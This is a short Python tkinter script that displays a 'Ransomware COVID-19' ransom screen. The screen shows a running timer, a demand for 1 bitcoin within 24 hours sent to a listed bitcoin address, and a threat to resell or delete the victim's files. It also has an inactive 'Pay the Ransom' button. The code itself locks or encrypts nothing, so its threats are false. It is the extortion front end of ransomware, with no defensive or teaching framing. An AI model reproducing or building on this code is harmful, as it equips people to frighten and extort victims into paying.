#!/usr/bin/python
#coding:utf-8
from tkinter import *
from timeit import default_timer
import tkinter as tk
import os, time, sys

def updateTime():
    now = default_timer() - start
    minutes, seconds = divmod(now, 60)
    hours, minutes = divmod(minutes, 60)
    str_time = "%d:%02d:%02d" % (hours, minutes, seconds)
    canvas.itemconfigure(text_clock, text=str_time, font=(None, 35))
    window.after(1000, updateTime)

def instructions():
    txt = tk.Label(font="bold", text="\nYour computer it's locked by the Ransomware COVID-19\n\n \
    For unlock to computer,\n \
    You have 24 HOURS to buy 1 bitcoin and transfert it at this address :\n\n \
    34YVap4JyjiBTWvy6Qobmni1k3tHbdi8UEL")
    txt.pack()

def warning():
    wrn = tk.Label(font="bold", text="Warning !\n \
    Restarting is useless\n\n \
    If you don't pay, all your sensitive files will be resold and the rest deleted.\n")
    wrn.pack()

def pay_to_decrypt():
    btn1 = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black")
    btn1.pack(side=tk.TOP)

window = Tk()
window.title("****Ransomware COVID-19**** $$Payment Instructions$$")
window.attributes('-disabled', True)

start = default_timer()
canvas = Canvas(window, width=400, height=250, bg="red")
canvas.pack(padx=25, pady=25)
text_clock = canvas.create_text(200, 125)

instructions()
updateTime()
warning()
pay_to_decrypt()
window.mainloop()
